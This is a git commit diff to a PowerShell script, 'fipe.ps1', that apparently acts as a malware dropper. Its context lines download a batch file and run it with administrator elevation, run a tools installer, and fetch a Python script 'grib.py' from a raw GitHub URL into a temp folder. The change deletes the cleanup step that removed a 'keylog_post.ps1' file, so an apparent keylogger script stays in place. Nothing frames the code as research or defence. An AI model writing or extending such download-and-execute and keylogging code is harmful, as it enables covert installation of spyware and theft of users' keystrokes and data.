388984c5d33844443f9ddf7ad1b130bd8203bd36
FanAPIpipa <156794064+FanAPIpipa@users.noreply.github.com>
2024-02-03 19:52:08 +0300

    Update fipe.ps1

--- fipe.ps1
+++ fipe.ps1
@@ -21,8 +21,6 @@ if (Test-Path $fgapeScriptPath) {
     Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
     Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
     Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
-    $keylogScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "keylog_post.ps1"
-    Remove-Item -Path $keylogScriptPath -Force
     $gribScriptUrl = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/grib.py"
     $gribScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "grib.py"
     Invoke-WebRequest -Uri $gribScriptUrl -OutFile $gribScriptPath
